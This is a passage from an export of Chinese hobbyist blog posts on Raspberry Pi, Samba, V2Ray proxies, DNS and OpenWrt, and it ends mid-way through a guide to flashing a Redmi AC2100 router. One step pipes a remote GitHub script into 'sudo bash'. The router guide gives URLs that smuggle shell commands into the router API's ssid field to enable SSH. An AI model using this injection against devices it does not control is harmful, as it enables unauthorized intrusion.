restart\n```\n\n接下来，为Samba服务添加一个用户，该用户需要是Linux系统中存在的用户，例如我的树莓派系统下有个用户叫ubuntu，故可通过以下命令将其添加进去\n\n\n\n```bash\nsudo smbpasswd -a ubuntu\n```\n\n设置好密码，即可添加成功。\n\n\n### 配置共享文件\n\n\n依然修改/etc/samba/smb.conf：\n\n\n\n```bash\nsudo vi /etc/samba/smb.conf\n```\n\n在文件的末尾添加以下内容：\n\n\n\n```ini\n[public]\n   comment = Public Files\n   path = /mnt/shared/public\n   read only = no\n   public = yes\n   browseable = yes\n   writable = yes\n   available = yes\n\n[private]\n   comment = Private Files\n   path = /mnt/shared/private\n   read only = no\n   public = no\n   browseable = yes\n   writable = yes\n   available = yes\n   valid users = ubuntu\n```\n\n这些配置信息通俗易懂，大概意思是设置了两个访问路径，分别为public与private，对应到本地刚刚创建的/mnt/shared/public和/mnt/shared/private目录，然后对两个访问路径的权限进行了基本的配置，private目录只有ubuntu用户才能访问。详细的配置参数信息建议阅读官方文档！最后再重启服务，服务即配置成功！真的是非常之ez！\n\n\n\n```bash\nsudo /etc/init.d/smbd restart\n```\n\n## 开机自启脚本\n\n\n由于我的存储设备是额外挂上去的，保不准哪天我忘记挂硬盘，导致Samba服务出现一些潜在的问题，基于此，我把服务的开机启动取消了，同时在rc.local中写了一段脚本来控制服务的启动。\n\n\n先取消服务的开机自启\n\n\n\n```bash\nsudo systemctl disable smbd\n```\n\n在/etc/rc.local中增加以下脚本：\n\n\n\n```bash\nextra_disk=`fdisk -l | grep 'Microsoft basic data' | awk '{print $1}'`\nif [ -n \"$extra_disk\" ];\nthen\n\tmount $extra_disk /mnt/shared -o iocharset=utf8,uid=nobody,gid=nogroup,umask=0000\n\tsystemctl start smbd\nfi\n```\n\n其中'Microsoft basic data'是我SSD上的识别信息，如果识别到该字符串，则意味着硬盘已经接上树莓派了，从而执行if语句内的挂载硬盘命令和服务启动命令。（bash的语法真是反人类。。。）\n\n\n另外，还有一种开机挂载硬盘的方法，是通过/etc/fstab文件，在该文件中加上下面一行内容：\n\n\n\n```bash\nUUID=7B4D-E1F4  /mnt/shared     auto defaults,nofail,x-systemd.device-timeout=1,noatime,umask=0000,nonempty,iocharset=utf8       0       0\n```\n\n其中UUID是硬盘设备的UUID，可通过blkid命令获取。\n\n\n如此一来，Samba服务已经配置成功了，不过具体如何在其他设备上访问，这个涉及到设备的操作系统对Samba服务的支持方式，可[查看此文](/blog/5556/)！\n\n\n不过，树莓派的USB电流大小似乎不太够支持1T的移动硬盘，可以考虑外部供电。\n","tags":["Linux","树莓派","Samba"],"categories":["瞎捣鼓经历"]},{"title":"树莓派4B通过USB启动Ubuntu 20.04 Server系统","url":"//blog/5510/","content":"\n入手树莓派后，一直以来是用TF卡（micro SD卡）作为存储卡，我购买的TF卡只有32G，TF卡读写速度慢，且容易损坏。\n\n\n\n因此我又购入了一块128G，提供USB接口的SSD硬盘，写入了Ubuntu 20.04 Server系统，试图从硬盘把树莓派启动起来。过程中遇坑无数，历经数十次失败后终于成功了，在此总结一下过程。\n\n![](https://oss.fyz666.xyz/blogfiles/png/2e392cc5bcd15c56b04fb8f1ba321409.png)\n\n本文参考自[此文章](https://jamesachambers.com/raspberry-pi-4-ubuntu-20-04-usb-mass-storage-boot-guide/)\n\n\n## 硬件\n\n\n- 树莓派4B（4G内存）\n- TF卡（SanDisk，32G）\n- SSD硬盘（STmagic，USB接口，128G）\n- 网线一根（为了通过SSH登录树莓派）\n- HDMI显示屏（可选，便于实时观察启动过程，查看出现的问题，不过没有也无所谓）\n\n## 软件\n\n\n- Ubuntu 20.04.2 Server [点此下载](https://ubuntu.com/download/raspberry-pi/thank-you?version=20.04.2&architecture=server-arm64+raspi)\n- Raspberry Pi OS（官方树莓派系统，也称为Raspbian）[点此下载](https://downloads.raspberrypi.org/raspios_lite_armhf/images/raspios_lite_armhf-2021-05-28/2021-05-07-raspios-buster-armhf-lite.zip)\n\n## 进入正题\n\n\n### 修改树莓派的启动配置\n\n\n树莓派默认状态是TF卡启动，需要进行修改，修改需要用到官方树莓派系统，启动流程如下：\n\n\n1. 将Raspberry Pi OS的img文件烧入TF卡，在boot目录下创建空的ssh文件以在开机后自动开启ssh服务。\n2. 将TF卡插入树莓派，连接网线到路由器LAN口，打开电源启动系统。\n3. 稍等片刻，用局域网扫描工具（如nmap）得到树莓派的IP地址，进而通过SSH登录，默认用户名和密码分别是pi、raspberry\n\n登录到树莓派系统后，首先要进行系统的更新，执行以下命令：\n\n\n\n```bash\nsudo apt update\nsudo apt full-upgrade\n```\n\n然后更新BootLoader，执行命令\n\n\n\n```bash\nvcgencmd bootloader_version\n```\n\n查看BootLoader版本，若日期早于2020.9.3，则其无法支持USB启动，需要进行更新。更新方法如下：\n\n\n首先修改文件/etc/default/rpi-eeprom-update\n\n\n\n```bash\nsudo nano /etc/default/rpi-eeprom-update\n```\n\n将其修改为：\n\n\n\n```raw\nFIRMWARE_RELEASE_STATUS=\"stable\"\n```\n\n即稳定版本，然后执行以下命令更新版本：\n\n\n\n```bash\nsudo rpi-eeprom-update -d -f /lib/firmware/raspberrypi/bootloader/stable/pieeprom-2021-04-29.bin\n```\n\n这里我用的是日期为2021-04-29的最新版本，请根据自己的文件对命令进行更改。\n\n\n更新完以后需要reboot。\n\n\n重启以后，执行命令\n\n\n\n```bash\nvcgencmd bootloader_version\n```\n\n检查版本日期是否为2021-04-29（或者你自己前面选择的版本日期），若无误，则执行命令\n\n\n\n```bash\nsudo raspi-config\n```\n\n以配置USB启动，在可视化界面中选择Advanced Options > BOOT ORDER，修改为USB启动，对应的配置为0x41（即首先检查TF卡，若检查不到或TF卡内没有安装系统，则使用USB启动）。\n\n\n设置完成后需要reboot。\n\n\n重启后，执行命令\n\n\n\n```bash\nvcgencmd bootloader_config\n```\n\n检查BOOT_ORDER项，若一切正常，该项的值应为0x41。\n\n\n做了以上的操作之后，接下来对SSD内的Ubuntu系统进行一些修改，以支持USB启动。\n\n\n### 修改Ubuntu系统\n\n\nUbuntu 20.04 Server镜像无法直接通过USB启动树莓派，需要做一些修改。将该镜像写入SSD设备，SSD连接到树莓派的USB接口，我购买的SSD的接口是USB3.0，因此接到蓝色的USB3.0接口上。\n\n\n执行命令`sudo fdisk -l`可以查看到所有设备，很容易识别出自己的SSD设备，比如我的是/dev/sda。\n\n\n在/mnt目录下创建boot目录和writable目录，分别把SSD的两个挂载点挂载到boot和writable目录：\n\n\n\n```bash\nsudo mkdir /mnt/boot\nsudo mkdir /mnt/writable\nsudo mount /dev/sda1 /mnt/boot\nsudo mount /dev/sda2 /mnt/writable\n```\n\n需要根据自己设备的情况修改命令里的/dev/sda1和/dev/sda2。\n\n\n然后运行一个脚本，以对系统进行修改：\n\n\n\n```bash\nsudo curl https://raw.githubusercontent.com/TheRemote/Ubuntu-Server-raspi4-unofficial/master/BootFix.sh | sudo bash\n```\n\n如果访问困难，可以先开梯子下载下来，再运行。\n\n\n接下来，是我之前失败的数十次尝试中未曾操作的步骤，在操作了这个步骤后，USB启动再没有遇到任何其他问题，而且开机速度飞快。\n\n\n### 使用Quirks修复USB适配器的问题\n\n\n在我通过USB启动树莓派失败的时候，大多是进入了emergency mode，无法正常开机，可能是因为我的USB存储适配器不能很好地与 Raspberry Pi 4 配合使用。如果你已经可以正常通过USB启动，则可以直接省略下面的步骤。\n\n\n执行命令：\n\n\n\n```bash\nlsusb\n```\n\n查看本机检测到的USB适配器，很容易可以找到自己的USB适配器的ID，比如我的是：152d:0578\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/f0fa71722f293d34c401d42575ad7e66.jpg)将此ID记录下来。\n\n\n修改文件/mnt/boot/cmdline.txt，在最前面加上以下内容（结尾有个空格与原来的内容分隔开）：\n\n\n\n```raw\nusb-storage.quirks=152d:0578:u \n```\n\n注意将ID部分修改为自己的USB适配器ID，经过如此修改后，可以将/mnt/boot和/mnt/writable两个挂载点取消挂载，随后用`sudo shutdown now`命令关闭树莓派，关闭电源，将TF卡移除后，重新开启电源，如一切顺利，树莓派就可以通过USB启动了！\n","tags":["Linux","树莓派"],"categories":["瞎捣鼓经历"]},{"title":"从公网访问内网设备——内网穿透的一种手动部署方法","url":"//blog/5473/","content":"\n本文参考自下面文档：\n\n{%link V2Ray反向代理,新V2Ray白话文指南,https://guide.v2fly.org/app/reverse.html%}\n\n\n有时候我们需要远程访问自家家里的局域网设备，比如设备上的NAS服务、Web服务等，这种情况下，如果家里路由器的WAN口被直接分配了公网IP，那么在不考虑安全性的情况下，只要通过端口映射即可轻松达成目的，但一般家用路由器不太可能拿到公网IP，这种方法基本用不起来，这时便可采用另一种方法，称为内网穿透。\n\n内网穿透需要一台具有公网IP的服务器作为中转，一种方法是直接使用成熟的第三方平台，例如花生壳，但免费用户每月只有一个G的流量，如果要付费的话，那倒不如去租一台服务器自己搭，因此我选择了后者。以下假设家里的内网设备为A，公网服务器为B，其IP为1.2.3.4，另一台未接入内网，但需要访问A的设备为C。以下假设需要通过访问1.2.3.4的8080端口来间接访问A设备上的Web服务（80端口）\n\n\n使用软件为V2ray，需要在A和B上运行V2ray，但C上无需安装，以下给出A与B的配置。\n\n\nA（内网设备）的配置：\n\n```json\n{  \n  \"reverse\":{\n    \"bridges\":[  \n      {  \n        \"tag\":\"bridge\",\n        \"domain\":\"private.cloud.com\"\n      }\n    ]\n  },\n  \"outbounds\": [\n    {\n      \"tag\":\"tunnel\",\n      \"protocol\":\"vmess\",\n      \"settings\":{  \n        \"vnext\":[  \n          {  \n            \"address\":\"1.2.3.4\",\n            \"port\":16384,\n            \"users\":[  \n              {  \n                \"id\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\n                \"alterId\":64\n              }\n            ]\n          }\n        ]\n      }\n    },   \n    {  \n      \"protocol\":\"freedom\",\n      \"settings\":{  \n      },\n      \"tag\":\"httpout\"\n    }    \n  ],\n  \"routing\":{   \n    \"rules\":[  \n      {\n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"bridge\"\n        ],\n        \"domain\":[  \n          \"full:private.cloud.com\"\n        ],\n        \"outboundTag\":\"tunnel\"\n      },\n      {\n        \"type\":\"field\",\n        \"inboundTag\":[  \n          \"bridge\"\n        ],\n        \"outboundTag\":\"httpout\"\n      }\n    ]\n  }\n}\n```\n\nB（公网设备）的配置：\n\n\n\n```json\n{\n  \"log\":{\n    \"access\": \"/var/log/v2ray/access.log\",\n    \"error\": \"/var/log/v2ray/error.log\",\n    \"loglevel\": \"warning\"\n  },\n  \"reverse\": {\n    \"portals\": [\n      {\n        \"tag\": \"portal\",\n        \"domain\": \"private.cloud.com\"\n      }\n    ]\n  },\n  \"inbounds\": [\n    {\n      \"tag\": \"http\",\n      \"port\": 8080,\n      \"protocol\": \"dokodemo-door\",\n      \"settings\": {\n        \"address\": \"127.0.0.1\",\n        \"port\": 80,\n        \"network\": \"tcp\"\n      }\n    },\n    {\n      \"tag\": \"tunnel\",\n      \"port\": 16384,\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"clients\": [\n          {\n            \"id\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\n            \"alterID\": 64\n          }\n        ]\n      }\n    }\n  ],\n  \"routing\": {\n    \"rules\": [\n      {\n        \"type\": \"field\",\n        \"inboundTag\": [\n          \"http\"\n        ],\n        \"outboundTag\": \"portal\"\n      },\n      {\n        \"type\": \"field\",\n        \"inboundTag\": [\n          \"tunnel\"\n        ],\n        \"domain\": [\n          \"full:private.cloud.com\"\n        ],\n        \"outboundTag\": \"portal\"\n      }\n    ]\n  }\n}\n```\n\n其中，\"private.cloud.com\"可以任选，无需是你注册的域名，公网服务器的对应端口（8080、16384）必须打开。通过这些配置，即可远程访问到内网设备，非常ez！。不过本文仅仅给了个配置，具体的细节还是前往开头的参考网址查看。\n","tags":["计算机网络","V2Ray","内网穿透"],"categories":["瞎捣鼓经历"]},{"title":"利用网关设备搭建私用无污染DNS服务器","url":"//blog/5447/","content":"\n前面文章提到过，即使使用了代理，也常会出现无法访问某些网站的情况，其实这就是因为DNS被污染了，因此为了更科学地上网，我们可以在网关设备上搭建一个私用的无污染DNS服务器。\n\n## 网关设备\n\n\n这里先简单讲一下什么是网关设备，网关设备可以简单理解为你的局域网接入外部网络的最后一道关口（当然实际上不一定是最后一道，比如我下面的例子里 网关外面还有一个路由器），所有局域网流量在进入公网前都将首先经过该设备，再由该设备进行转发。除了普通家用路由器自身即可充当网关设备外，任何一台具备ip转发功能的设备都可以作为网关，比如一台废弃不用的笔记本电脑、部署在设备上的虚拟机等等。\n\n\n这里我使用的网关设备是树莓派，其相当于一台轻量级的Linux电脑，拥有4逻辑核CPU、4G内存与32G存储卡。\n\n\n## 基本网络配置\n\n\n我的网络架构及基本的网络设置大概如下（因为没办法在软件上模拟WiFi，故使用一条以太网线当做LAN-Device与路由器间的WiFi连接）：\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/f391712bc9bdae097270a9e9309dd223.jpg)\n\n- OpenWrt路由器WAN口连接外网，所有LAN口通过虚拟设备(br-lan)进行桥接，并分配静态IP为192.168.1.1\n\n- 网关设备树莓派的以太口连接路由器一个LAN口，分配静态IP为192.168.1.2，网关设为LAN口IP：192.168.1.1，同时在网关设备上开启ipv4转发。\n- 路由器开启DHCP服务，将自动分配的网关设为树莓派IP：192.168.1.2\n\n如此配置后，局域网内的设备应该已经可以正常上网了，如果不能上网请仔细检查网络配置或重连WiFi再次尝试。\n\n\n如上图中的箭头方向所示，从局域网设备发出的流量将经过路由器的网桥到达网关设备树莓派，经过树莓派的处理后再转发至路由器LAN口，最后由路由器转发至外部网络，这一流程可以通过`traceroute`命令（Windows下是`tracert`）进行验证。虽然这样配置会比正常家用路由器多两次转发，但相对于外网的延迟来说，这点延迟几乎可以忽略不计。\n\n\n## DNS服务器搭建\n\n\n### DNS查询过程\n\n\n在上面的默认配置下，当局域网内主机发起一个DNS请求时，其查询顺序如下：\n\n\n1. 查询DNS缓存与本地的hosts文件，若查到，直接返回结果，否则进入下一步。\n2. 向路由器的53端口发起DNS查询，路由器查询DNS缓存与本地的hosts文件（如果有的话），若查到，则直接返回应答，否则进入下一步。\n3. 路由器向其上游DNS服务器（一般默认为当地ISP的DNS服务器）发起查询，至此，DNS查询进入了公网。然后，若上游DNS服务器被污染，你就有可能获得一个错误的DNS应答，然后因为路由器及本机会把查询结果进行一定时间的缓存，你就会发现有好一段时间访问不了该网站了。\n\n由上面的查询过程可以发现，问题应该出在路由器上游DNS服务器的分配上，其默认的上游DNS一般是由ISP分配的自己的DNS服务器，而国内的DNS服务器因为某些特殊原因，几乎都是受污染的。因此有必要自己来搭建一台无污染的DNS服务器。\n\n\n所谓无污染DNS服务器，其实就是通过一些域名列表来主动选择上游DNS服务器，以达到净化的目的，我感觉作为一种基于域名列表的筛选方法还是有一定的局限性，但对于我们个人的上网需求那是妥妥够用了。当然，你也可以简单粗暴直接直接配置国外的公用DNS作为全部域名查询的上游，但这样做会导致DNS响应速度慢，还很容易把国内一些有全球CDN或负载均衡的服务解析到国外的IP，对国内网站的访问速度极其不利。最优选择是你找到了一台国内的无污染DNS，但这往往不可多得。\n\n\n### 软件及配置方法\n\n\n这里我用到的软件是Dnsmasq与Pi-hole。\n\n\nDnsmasq是一款同时拥有DHCP与DNS查询缓存功能的软件，我将其装在了路由器上，当然也完全可以装在树莓派上，只是一些网络配置得做略微的修改。\n\nPi-hole最早是基于树莓派系统开发出来的软件，拥有DNS查询、缓存、广告屏蔽等功能，可操作性很强，目前已经适用于各大Linux系统。\n\n{%link Pi-Hole,GitHub,https://github.com/pi-hole/pi-hole %}\n\n\n关于两个软件的安装方法，这里不再赘述，你都想自己折腾DNS服务器了，最基本的软件安装肯定能自己解决吧。\n\n\n以下基于Dnsmasq装在路由器上的配置来简单说明。\n\n\n首先，当然是先取消路由器的resolve功能，即不使用ISP自动分配的DNS服务器，然后将路由器DHCP服务分配的DNS服务器设置为网关的IP，这里即192.168.1.2，并设置路由器的Dnsmasq监听端口为53（其实是默认值）。\n\n\n随后打开Pi-hole的网页管理界面，选择Settings->DNS，将左侧的所有选项都取消勾选，但勾选右侧的Custom 1(ipv4)，填入路由器的Dnsmasq监听地址，即192.168.1.1#53，也可以自己再加几个第三方的DNS作为备用，最后别忘了保存！\n\n\n最后检查网关设备上的如下配置文件：/etc/dhcpcd.conf，该文件是Pi-hole的依赖软件的一个配置文件，它将用于定义设备的接口信息，配置比较通俗易懂，注意将静态ip（static ip_address）与网关（static routers）设置正确，当然最重要的，一定要设置static domain_name_servers为127.0.0.1，即本地ip，这样才会在本地的53端口正常监听DNS请求，从而可以通过Pi-hole转发到其上游服务器（192.168.1.1#53）。\n\n\n至此，一台普通的DNS服务器已经部署成功了，可以在本机与网关设备上通过nslookup查询一下国内的一些域名，看看能不能按你所希望的流程拿到查询结果。\n\n\n当然现在还没有设置最重要的防污染，可以结合[ChinaDNS](https://github.com/shadowsocks/ChinaDNS)项目来做防污染，不过因为该项目的作者之前被请喝茶了，这个项目已经多年没有维护，因此我只用Dnsmasq来完成类似的上游服务器选择工作。\n\n\n在进行下一步之前，请先选择好最适合你的两台DNS服务器，一台为国内DNS，诸如阿里的DNS、电信的DNS都可；另一台为国外DNS，比如OpenDNS、或Google家的，每个人的网络环境差别巨大，所以还是得自己多实验，选择最适合自己的。\n\n然后我们需要一些域名的列表，可参考下面链接：\n\n{%link 国内主流域名列表,GitHub,https://github.com/felixonmars/dnsmasq-china-list %}\n\n\n下载文件后，我们将主要的文件`accelerated-domains.china.conf`进行修改：使用全局替换将文件里的DNS服务器替换为刚刚选择的国内DNS，然后放置到Dnsmasq服务所在设备的`/etc/dnsmasq.d/`目录下（如果没有该目录则新建），其余文件视情况随意添加。其余情况下则使用国外DNS进行解析。\n\n\n最后在`/etc/dnsmasq.conf`文件中添加一行：`conf-dir=/etc/dnsmasq.d`，然后重启Dnsmasq服务即可生效。\n\n\n为了优化上网体验，减少向外网的DNS查询次数，还可以将Dnsmasq的`min-cache-ttl`设置的稍大一些，经实测，此套配置在访问外网时没有任何卡顿，网站打开的速度也有了飞跃性的提升。\n\n\n至此，无污染DNS服务器已完全搭建完成。\n","tags":["Linux","OpenWrt","计算机网络","DNS","树莓派"],"categories":["瞎捣鼓经历"]},{"title":"OpenWrt下游主机通过IPv6上网的一种方法","url":"//blog/5405/","content":"\nIPv6因IPv4地址池不够用而被提出，至今已有近30年了，但在国内的普及程度仍非常有限，不过，国内的ISP运营商基本都已经提供IPv6接入了，也就是说家里的宽带一般是支持IPv6的。\n\n很多家用路由器尚无法为局域网设备发放IPv6的全局单播（Global）地址，更有一些号称支持IPv6的路由器，其下游局域网设备只能获取到链路本地（Link-Local）地址，其仅支持同一链路的设备通信（类似于局域网的作用），而不能访问到公网的IPv6。随着IPv6的普及，支持公网IPv6地址分配的路由器今后将会越来越多。\n\n\nOpenWrt固件支持以Native方式通过WAN口从ISP获取IPv6全局单播地址，虽然支持程度一般，但至少可以通过IPv6上网了。\n\n\n首先要保证WAN口有IPv6全局单播地址，然后打开`/etc/config/network`文件，在其中可以看到以下配置：\n\n```ini\nconfig interface 'wan6'\n    option proto 'dhcpv6'\n```\n\n可知IPv6对应的接口是wan6，接下来配置文件`/etc/config/dhcp`：\n\n```ini\nconfig dhcp 'lan'\n\t...\n\toption dhcpv6 'relay'\n\toption ra 'relay'\n\toption ndp 'relay'\n\nconfig dhcp 'wan6'\n\toption interface 'wan6'\n\toption dhcpv6 'relay'\n\toption ra 'relay'\n\toption ndp 'relay'\n\toption master '1'\n```\n\n只要配置'lan'和'wan6'的几条选项即可。最后重启dnsmasq与odhcp：\n\n```bash\n/etc/init.d/dnsmasq restart\n/etc/init.d/odhcpd restart\n```\n\n稍等片刻，下游设备就可以获取到IPv6全局单播地址啦。\n\n\n当然通过IPv6上网还有其他方法，例如NAT6（相当于IPv4的NAT），但反正IPv6地址根本用不完，获取一个全局单播地址何乐而不为呢？\n","tags":["IPv6","OpenWrt","计算机网络","路由器"],"categories":["瞎捣鼓经历"]},{"title":"在OpenWrt上配置透明代理","url":"//blog/5380/","content":"\n用OpenWrt的原因，我觉得对大部分中国大陆的互联网用户而言是不言而喻的，其拥有比一般路由器更高的灵活性与自由度，更重要的是可以方便舒适地进行某些活动。\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/8863b05422e5f59b8692971abfd1e37f.jpeg)这里我们用到的梯子就是v2ray，相信能用上这款软件的，应该或拥有一台VPS并配置好了v2ray服务端，或拥有了能用的机场节点，本文不介绍如何获取节点，只给出在已有节点的条件下，一种能实现透明代理的客户端配置。\n\n配置来自于下面文档：\n\n{%link 配置透明代理规则,新V2Ray白话文指南,https://guide.v2fly.org/app/tproxy.html#%E9%85%8D%E7%BD%AE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99 %}\n\n并经过了一些调整，并删去了一些udp和dns的配置。\n\n\n## 为什么要用透明代理？\n\n\n一般而言，v2ray在各操作系统上都有拥有GUI界面的客户端，配置也十分容易，但由于需要下载软件、开启软件、甚至手动切换或选择代理模式，因此容易造成体验不佳（没错我就是这么懒），另外，跑在电脑端的代理软件无法获取操作系统的最高权限，即使开了全局代理模式也会无法接管到某些处于网络协议栈低层的流量，例如如果你有玩Steam游戏的习惯，你大概率会发现v2ray无法加速大部分steam游戏；再如，你想在家里的智能电视上翻墙看Netflix影片，总不能在电视系统上装个代理软件吧。在种种特殊需求以及懒病的加持下，我们就有了这个透明代理的需求。透明代理可以简单理解为一台介于客户端与服务端的设备，用以主动处理转发客户端的请求，基于规则将你希望交给v2ray服务端处理的请求转发到代理端口，否则直连，这样就使得客户端用户可以无缝切换代理与非代理状态，从而感受不到“墙”或代理的存在，实现所谓的“透明代理”，同时作为客户端接入局域网的唯一路径，其也可以无视客户端操作系统而接管所有的流量，实现真正的全局代理。\n\n\n透明代理有多种实现，我这里采用最直接的硬路由刷OpenWrt的方法，即在网关路由器上配置一些转发规则。另外，考虑到一般的路由器CPU的算力比较差，透明代理也可以设置在旁路由上，以提升体验。\n\n\n## 安装V2ray\n\n\n首先，因为是在路由器上做透明代理，故需要在路由器上安装适应的v2ray。可以参考github的一个项目：[v2ray-openwrt](https://github.com/kuoruan/openwrt-v2ray)\n\n\n在项目的releases中选择适合自己openwrt路由器CPU架构的版本。\n\n\nCPU架构可以通过以下命令获知：\n\n\n\n```bash\nopkg print-architecture | awk '{print $2}' | grep -v all | grep -v noarch\n```\n\n例如，我的路由器上的输出结果是：mipsel_24kc。\n\n\n将下载下来的文件放到路由器上，通过`opkg install v2ray-core*.ipk`命令进行安装，若安装失败，则需要检查版本是否匹配、是否进行了换源。\n\n\n透明代理用到的是v2ray的dokodemo-door协议，下面给一个基于白名单规则的配置文件，适合平时访问国外站点比较多的用户使用：\n\n\n\n```json\n{\n  \"inbounds\": [\n    {\n      \"tag\": \"transparent\",\n      \"port\": 12345,\n      \"protocol\": \"dokodemo-door\",\n      \"settings\": {\n        \"network\": \"tcp,udp\",\n        \"followRedirect\": true\n      },\n      \"sniffing\": {\n        \"enabled\": true,\n        \"destOverride\": [\"http\", \"tls\"]\n      },\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"tproxy\": \"tproxy\"\n        }\n      }\n    }\n  ],\n  \"outbounds\": [\n    { \n      \"tag\": \"proxy\",\n      \"protocol\": \"vmess\",\n      \"sendThrough\": \"0.0.0.0\",\n      \"settings\": {\n        \"vnext\": [\n          ...\n        ]\n      },\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"mark\": 255\n        }\n      }\n    },\n    {\n      \"tag\": \"block\",\n      \"protocol\": \"blackhole\",\n      \"settings\": {\n        \"response\": {\"type\": \"http\"}\n      }\n    },\n    {\n      \"tag\": \"direct\",\n      \"protocol\": \"freedom\",\n      \"settings\": {},\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"mark\": 255\n        }\n      }\n    }\n  ],\n  \"routing\": {\n    \"domainStrategy\": \"IPOnDemand\",\n    \"rules\": [\n      {\n        \"type\": \"field\",\n        \"outboundTag\": \"block\",\n        \"domain\": [\"geosite:category-ads-all\"]\n      },\n      {\n        \"type\": \"field\",\n        \"outboundTag\": \"direct\",\n        \"domain\": [\"geosite:cn\"]\n      },\n      {\n        \"type\": \"field\",\n        \"outboundTag\": \"direct\",\n        \"ip\": [\n          \"geoip:cn\",\n          \"geoip:private\"\n        ]\n      }\n    ]\n  }\n}\n﻿\n```\n\nvnext的配置就按你VPS服务器的配置来。通过此配置文件启动的v2ray路由满足以下几条（白名单）规则：\n\n\n1. 首先，屏蔽所有在geosite:category-ads-all列表里的常见广告域名。\n2. 然后对所有常见中国大陆域名直接走直连。\n3. 若不满足第二条，进行DNS解析，若得到结果为中国大陆的ip地址或内网ip地址，则走直连。\n4. 其他情况一律走代理。\n\n然后运行以下几条命令设置流量转发规则：\n\n\n\n```bash\nip rule add fwmark 1 table 100\nip route add local 0.0.0.0/0 dev lo table 100\n\niptables -t mangle -N V2RAY\niptables -t mangle -A V2RAY -d 127.0.0.1/32 -j RETURN\niptables -t mangle -A V2RAY -d 224.0.0.0/4 -j RETURN\niptables -t mangle -A V2RAY -d 255.255.255.255/32 -j RETURN\niptables -t mangle -A V2RAY -d 192.168.0.0/16 -p tcp -j RETURN\niptables -t mangle -A V2RAY -j RETURN -m mark --mark 0xff\niptables -t mangle -A V2RAY -p tcp -j TPROXY --on-ip 127.0.0.1 --on-port 12345 --tproxy-mark 1\niptables -t mangle -A PREROUTING -j V2RAY\n\niptables -t mangle -N V2RAY_MASK\niptables -t mangle -A V2RAY_MASK -d 224.0.0.0/4 -j RETURN\niptables -t mangle -A V2RAY_MASK -d 255.255.255.255/32 -j RETURN\niptables -t mangle -A V2RAY_MASK -d 192.168.0.0/16 -p tcp -j RETURN\niptables -t mangle -A V2RAY_MASK -j RETURN -m mark --mark 0xff\niptables -t mangle -A V2RAY_MASK -p tcp -j MARK --set-mark 1\niptables -t mangle -A OUTPUT -j V2RAY_MASK\n\niptables -t mangle -N DIVERT\niptables -t mangle -A DIVERT -j MARK --set-mark 1\niptables -t mangle -A DIVERT -j ACCEPT\niptables -t mangle -I PREROUTING -p tcp -m socket -j DIVERT\n```\n\n做完这些设置，应该就正常访问Google了，但我发现还是没办法访问YouTube等在线学习网站，好像是因为DNS污染的问题，关于这个，其实v2ray也提供了DNS转发机制，不过我目前没有尝试，我目前使用的方法可参考此文：[无污染DNS服务搭建](/blog/5447/)。另外还有一种方法，即使用v2ray劫持53端口来实现反dns污染，可以[参考此文](https://guide.v2fly.org/app/tproxy.html#%E9%85%8D%E7%BD%AE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99)。\n\n\n最后，非常重要的是：\n\n\n**本文所介绍的内容主要是为了方便学习、外贸交流、科研等工作。在墙外请严格约束自身，遵守本国法律法规，切勿在任何地方发布分裂国家，涉恐等违法犯罪的言论。**\n","tags":["Linux","OpenWrt","计算机网络","路由器","V2Ray","科学上网"],"categories":["瞎捣鼓经历"]},{"title":"Redmi AC2100路由器刷OpenWrt固件","url":"//blog/5372/","content":"\n本文参考自下面视频：\n\n{% link [John] Redmi AC2100 OpenWrt installation (web exploit),YouTube,https://www.youtube.com/watch?v=d3km5n-d4io&t=199s&ab_channel=JohnMactavish %}\n\n\n首先感谢这位一口流利Chinglish的老哥发的这个视频让我毫无困难地刷机成功。接下来本文将该视频以文字的形式描述一下。\n\n## 硬件要求\n\n\n如题所示，你需要一台Redmi AC2100路由器，其他openwrt支持的小米系列路由器好像也适用，但本文只针对这一种，以下所有内容仅保证适用于AC2100，其他小米系列可作为参考自己尝试。\n\n\n如何判断一款路由器是否被openwrt所支持：[支持列表](https://openwrt.org/zh/toh/start)\n\n\n这里我好不容易才找到一款在某东商城和支持列表的交集里的路由器（应该是我的搜索方式不对），也就是这款红米AC2100，某东售价159（不是广告）。\n\n\n另外，还需要一台能连网线的电脑（openwrt默认关闭WiFi功能，需要通过网线连接打开WiFi，才能无线上网）。\n\n\n## 软件要求\n\n\n首先，可能不必要的一步操作，如视频所说，需要先下载Redmi AC2100的官方固件，版本为2.20.3（[传送门](http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/ac2100/miwifi_rm2100_all_fb720_2.0.23.bin)）为啥可能不必要，因为我发现我买过来这款路由器自带的版本已经是2.20.3了。\n\n\n然后去openwrt官网下载适合Redmi AC2100的openwrt固件（[传送门](https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100)），选择Installation中Firmware OpenWrt snapshot Install下的两个链接进行下载。\n\n\n## 操作流程\n\n\n第一步，用网线连接电脑与路由器的LAN口，然后浏览器打开192.168.31.1，在界面中找到软件升级，通过本地文件升级，选择2.20.3版本的软件包即可，升级大概需要2-5分钟。\n\n\n稍等片刻，路由器其中一个蓝灯亮起，意味着升级完成。\n\n\n### 开启路由器的SSH服务\n\n\n接下来需要先开启路由器的SSH服务，利用其自带的web api完成。\n\n\n继续访问192.168.31.1，登录成功后，浏览器地址栏中出现一串参数，找到其中的stok参数，保存下来。\n\n\n依次访问以下三个网址：\n\n\n- `http://192.168.31.1/cgi-bin/luci/;stok=<YOUR-STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit%3B`\n- `http://192.168.31.1/cgi-bin/luci/;stok=<YOUR-STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bsed%20-i%20's/channel=.*/channel=%5C%22debug%5C%22/g'%20/etc/init.d/dropbear%3B`\n- 